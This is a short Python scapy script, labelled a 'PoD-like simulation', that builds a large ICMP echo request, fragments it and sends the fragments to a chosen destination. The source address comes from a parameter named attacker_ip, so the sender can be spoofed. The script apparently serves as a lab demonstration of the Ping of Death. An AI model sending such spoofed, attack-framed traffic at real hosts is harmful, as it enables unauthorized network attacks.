#!/usr/bin/env python3

import time
from scapy.all import IP, ICMP, Raw, fragment, send


def run_pod(
    attacker_ip,
    destination_ip,
    payload_size=10000,
    fragment_size=500,
    interval=0.01,
    log=print,
):

    log(f"PoD-like simulation started")
    log(f"Source IP: {attacker_ip}")
    log(f"Destination IP: {destination_ip}")
    log(f"Payload size: {payload_size} bytes")
    log(f"Fragment size: {fragment_size} bytes")

    packet = (
        IP(src=attacker_ip, dst=destination_ip)
        / ICMP(type="echo-request")
        / Raw(load=b"A" * payload_size)
    )

    fragments = fragment(packet, fragsize=fragment_size)

    log(f"Created {len(fragments)} IP fragments")

    for index, packet_fragment in enumerate(fragments, start=1):
        offset = packet_fragment.frag * 8
        more_fragments = int(packet_fragment.flags.MF)
        packet_size = len(packet_fragment)

        log(
            f"[{index}/{len(fragments)}] "
            f"offset={offset}, MF={more_fragments}, size={packet_size}"
        )

        send(packet_fragment, verbose=False)
        time.sleep(interval)

    log("PoD-like simulation finished")